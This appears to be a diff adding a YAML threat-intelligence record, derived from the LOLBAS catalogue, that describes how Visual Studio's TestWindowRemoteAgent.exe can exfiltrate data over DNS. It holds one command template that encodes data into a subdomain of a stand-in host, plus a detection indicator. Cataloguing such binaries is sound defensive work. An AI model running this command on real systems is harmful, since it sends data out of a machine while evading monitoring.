@@ -1,0 +1,89 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL1Rlc3R3aW5kb3dyZW1vdGVhZ2VudC55bWw/VXBsb2Fk/0
+type: binary
+platform: windows
+name: TestWindowRemoteAgent.exe
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1048
+opsec:
+  noise: high
+  triggers: TestWindowRemoteAgent.exe spawning unexpectedly
+commands:
+- template: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+  comment: Sends DNS query for open connection to any host, enabling exfiltration over DNS
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Testwindowremoteagent/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: TestWindowRemoteAgent.exe
+      category: Upload
+      privileges: User
+      mitre_id: T1048
+      source_file: OtherMSBinaries/Testwindowremoteagent.yml
+      command_source_index: 0
+      document_utf8: "---\nName: TestWindowRemoteAgent.exe\nDescription: TestWindowRemoteAgent.exe is\
+        \ the command-line tool to establish RPC\nAuthor: Onat Uzunyayla\nCreated: 2023-08-21\nCommands:\n\
+        \  - Command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000\n    Description:\
+        \ Sends DNS query for open connection to any host, enabling exfiltration over DNS\n    Usecase:\
+        \ Attackers may utilize this to exfiltrate data over DNS\n    Category: Upload\n    Privileges:\
+        \ User\n    MitreID: T1048\n    OperatingSystem: Windows 10, Windows 11\nFull_Path:\n  - Path:\
+        \ C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\\
+        Microsoft\\TestWindow\\RemoteAgent\\TestWindowRemoteAgent.exe\nDetection:\n  - IOC: TestWindowRemoteAgent.exe\
+        \ spawning unexpectedly\nAcknowledgement:\n  - Person: Onat Uzunyayla\n"
+      document_sha256: sha256:8ff0bfae3572e10e56718b88cbfdf7a9942f9b6ac1022467a1899e53af0556e4
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Testwindowremoteagent/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1048
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:6189614fcb10563c269709d3c405e8e2e1d7da08787967cf7e2c3109b80c1b9b
